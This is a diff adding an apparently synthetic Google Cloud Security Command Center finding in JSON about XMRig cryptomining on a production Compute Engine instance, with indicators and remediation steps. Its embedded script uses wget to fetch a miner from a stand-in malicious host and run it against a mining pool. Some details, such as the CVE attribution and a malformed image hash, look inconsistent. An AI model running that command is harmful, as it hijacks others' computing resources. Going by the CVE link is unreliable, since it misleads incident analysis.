@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "name": "organizations/123456789012/sources/1234567890123456789/findings/b9c8d7e6f5a4b3c2d1e0",
+    "parent": "organizations/123456789012/sources/1234567890123456789",
+    "resourceName": "//compute.googleapis.com/projects/production-project-12345/zones/us-central1-a/instances/web-server-prod-01",
+    "state": "ACTIVE",
+    "category": "Execution: Cryptocurrency Mining Hash Match",
+    "externalUri": "https://console.cloud.google.com/security/command-center/findings?organizationId=123456789012",
+    "sourceProperties": {
+      "contextUris": {
+        "mitreUri": {
+          "displayName": "Resource Hijacking",
+          "url": "https://attack.mitre.org/techniques/T1496/"
+        },
+        "virustotalIndicatorQueryUri": {
+          "displayName": "VirusTotal IP address scan",
+          "url": "https://www.virustotal.com/gui/ip-address/185.220.101.42"
+        }
+      },
+      "detectionCategory": {
+        "ruleName": "cryptocurrency_mining_hash_match",
+        "technique": "RESOURCE_HIJACKING",
+        "subRuleName": "xmrig_mining_pool_connection"
+      },
+      "properties": {
+        "instance_name": "web-server-prod-01",
+        "instance_id": "5678901234567890123",
+        "zone": "us-central1-a",
+        "machine_type": "n2-standard-4",
+        "process_name": "xmrig",
+        "process_pid": "12847",
+        "mining_pool": "pool.minexmr.com:4444",
+        "wallet_address": "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge",
+        "cpu_usage_percent": "98.5",
+        "network_connections": "12",
+        "command_line": "/tmp/.xmrig/xmrig -o pool.minexmr.com:4444 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"
+      },
+      "evidence": [
+        {
+          "sourceLogId": {
+            "projectId": "production-project-12345",
+            "resourceContainer": "projects/production-project-12345/zones/us-central1-a"
+          }
+        }
+      ]
+    },
+    "securityMarks": {
+      "name": "organizations/123456789012/sources/1234567890123456789/findings/b9c8d7e6f5a4b3c2d1e0/securityMarks",
+      "marks": {
+        "severity": "critical",
+        "incident_type": "cryptomining",
+        "remediation_status": "pending"
+      }
+    },
+    "eventTime": "2025-11-08T05:23:47.891Z",
+    "createTime": "2025-11-08T05:23:52.234Z",
+    "severity": "CRITICAL",
+    "canonicalName": "projects/production-project-12345/sources/1234567890123456789/locations/us-central1-a/findings/b9c8d7e6f5a4b3c2d1e0",
+    "mute": "UNMUTED",
+    "findingClass": "THREAT",
+    "indicator": {
+      "ipAddresses": [
+        "185.220.101.42",
+        "195.123.245.89"
+      ],
+      "domains": [
+        "pool.minexmr.com",
+        "xmr-pool-eu.hashvault.pro"
+      ],
+      "uris": [
+        "stratum+tcp://pool.minexmr.com:4444"
+      ],
+      "signatures": [
+        {
+          "signatureType": "PROCESS",
+          "signature": "xmrig cryptocurrency miner"
+        }
+      ]
+    },
+    "vulnerability": {
+      "cve": {
+        "id": "CVE-2023-32784",
+        "references": [
+          {
+            "source": "https://nvd.nist.gov/vuln/detail/CVE-2023-32784"
+          }
+        ],
+        "cvssv3": {
+          "baseScore": 9.8,
+          "attackVector": "NETWORK",
+          "attackComplexity": "LOW",
+          "privilegesRequired": "NONE",
+          "userInteraction": "NONE",
+          "scope": "UNCHANGED",
+          "confidentialityImpact": "HIGH",
+          "integrityImpact": "HIGH",
+          "availabilityImpact": "HIGH"
+        }
+      }
+    },
+    "muteUpdateTime": "2025-11-08T05:23:52.234Z",
+    "access": {
+      "principalEmail": "attacker@external-domain.com",
+      "callerIp": "185.220.101.42",
+      "callerIpGeo": {
+        "regionCode": "RO"
+      },
+      "userAgentFamily": "curl",
+      "userAgent": "curl/7.68.0",
+      "serviceName": "compute.googleapis.com",
+      "methodName": "v1.compute.instances.start",
+      "principalSubject": "user:attacker@external-domain.com"
+    },
+    "connections": [
+      {
+        "destinationIp": "195.123.245.89",
+        "destinationPort": 4444,
+        "protocol": "TCP"
+      },
+      {
+        "destinationIp": "185.220.101.42",
+        "destinationPort": 3333,
+        "protocol": "TCP"
+      }
+    ],
+    "processes": [
+      {
+        "name": "xmrig",
+        "binary": "/tmp/.xmrig/xmrig",
+        "libraries": [
+          "/lib/x86_64-linux-gnu/libc.so.6",
+          "/lib/x86_64-linux-gnu/libpthread.so.0"
+        ],
+        "script": {
+          "contents": "#!/bin/bash\nwget -q http://malicious-cdn.com/xmrig -O /tmp/.xmrig/xmrig\nchmod +x /tmp/.xmrig/xmrig\n/tmp/.xmrig/xmrig -o pool.minexmr.com:4444",
+          "size": "342"
+        },
+        "args": [
+          "-o",
+          "pool.minexmr.com:4444",
+          "-u",
+          "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"
+        ],
+        "pid": "12847",
+        "parentPid": "1"
+      }
+    ],
+    "compliances": [
+      {
+        "standard": "CIS Google Cloud Platform Foundation Benchmark",
+        "version": "1.3.0",
+        "ids": [
+          "4.1",
+          "4.3"
+        ]
+      }
+    ],
+    "description": "Cryptocurrency mining software (XMRig) detected running on Compute Engine instance 'web-server-prod-01' in zone us-central1-a. The instance is connecting to known Monero mining pool 'pool.minexmr.com' and consuming 98.5% CPU resources. The mining process was launched from /tmp/.xmrig/ directory, indicating potential compromise. The instance appears to have been compromised through exploitation of CVE-2023-32784 vulnerability. Unauthorized access originated from IP address 185.220.101.42 (Romania). This represents a critical security incident requiring immediate investigation and remediation.",
+    "nextSteps": "1. IMMEDIATE: Isolate the compromised instance 'web-server-prod-01' by removing it from production load balancers\n2. Stop the instance to prevent further resource consumption and lateral movement\n3. Create a forensic snapshot of the instance disk for investigation\n4. Review Cloud Audit Logs for unauthorized access attempts and API calls\n5. Check for other instances with similar patterns using Cloud Logging queries\n6. Identify the initial access vector (check for CVE-2023-32784 exploitation)\n7. Rotate all credentials and service account keys that may have been exposed\n8. Review IAM permissions and remove any unauthorized principals\n9. Apply security patches to all instances running similar software\n10. Enable VPC Flow Logs to monitor network traffic patterns\n11. Implement firewall rules to block connections to known mining pools\n12. Consider implementing binary authorization to prevent unauthorized software execution",
+    "moduleProperties": {
+      "moduleEnablementState": "ENABLED",
+      "moduleName": "EVENT_THREAT_DETECTION"
+    },
+    "contacts": {
+      "security": {
+        "email": "security-team@example.com"
+      }
+    },
+    "containers": [
+      {
+        "name": "xmrig-miner",
+        "uri": "malicious-cdn.com/xmrig",
+        "imageId": "sha256:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6",
+        "createTime": "2025-11-08T05:15:32.000Z"
+      }
+    ]
+  },
+  "notificationConfigName": "organizations/123456789012/notificationConfigs/scc-critical-findings",
+  "resource": {
+    "name": "//compute.googleapis.com/projects/production-project-12345/zones/us-central1-a/instances/web-server-prod-01",
+    "displayName": "web-server-prod-01",
+    "type": "google.cloud.compute.Instance",
+    "folders": [
+      {
+        "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/987654321",
+        "resourceFolderDisplayName": "Production"
+      }
+    ],
+    "project": "projects/783957204773",
+    "projectDisplayName": "production-project-12345",
+    "parentDisplayName": "Production",
+    "parentName": "//cloudresourcemanager.googleapis.com/folders/987654321"
+  }
+}
